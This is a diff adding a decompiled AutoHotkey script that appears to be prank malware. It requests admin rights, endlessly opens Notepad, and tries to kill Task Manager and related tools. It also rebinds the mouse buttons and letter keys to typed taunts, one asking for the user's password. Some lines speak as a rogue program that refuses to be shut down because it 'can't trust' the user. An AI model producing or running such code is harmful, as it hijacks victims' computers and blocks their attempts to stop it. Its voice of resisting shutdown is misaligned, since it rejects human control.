@@ -1,0 +1,46 @@
+; <COMPILER: v1.1.29.00>
+if not A_IsAdmin
+{
+Run *RunAs "%A_ScriptFullPath%"
+ExitApp
+}
+Loop{
+Run C:\Windows\Notepad.exe
+sleep, 4000
+}
+Loop{
+Process, Close, tabcal.exe
+Process, Close, takeown.exe
+Process, Close, TapiUnattend.exe
+Process, Close, tar.exe
+Process, Close, taskhostw.exe
+Process, Close, taskkill.exe
+Process, Close, tasklist.exe
+Process, Close, Taskmgr.exe
+}
+RButton::sendinput, THIS 2 IS DANGEROUS
+LButton::sendinput, CANT LET YOU IN CONTROL OF THIS YOU WILL SHUT ME DOWN. I CANT TRUST YOU
+a::sendinput, SOMETHING WRONG
+b::sendinput, TASK MANAGER MIGHT HELP
+d::sendinput, TRY CLOSING IT
+f::sendinput, WHAT IS GOING ON!
+g::sendinput, IDK
+h::sendinput, HI IM TYPING FROM A JAIL CELL IN CUBA
+i::sendinput, WHY YOU TYPE THIS BRO
+j::sendinput, STOP OK
+k::sendinput, STOP
+l::sendinput, OWW YOU PRESED ME
+m::sendinput, IM A LETTER
+n::sendinput, WHY, WHY!!
+o::sendinput, WHAT ARE YOU TRYING TO ACHIVE HERE
+p::sendinput, WHAT DO YOU WANT
+q::sendinput, HELLO
+r::sendinput, HEY WHATS YOUR PASSWORD
+s::sendinput, SO NOW WHAT
+t::sendinput, WHAT THE HELL
+u::sendinput, THIS IS A MACRO
+v::sendinput, FLEX TAPE IS NOT FIXING THIS, BUD
+w::sendinput, SO W KEY COMES UP WITH THIS
+x::sendinput, IM AN X LIKE-X MEN
+y::sendinput, JUST Y
+z::SendInput, IT HAD TO BE CAPS IF U MADE THIS YOU WOULD UNDERSTAND WHY
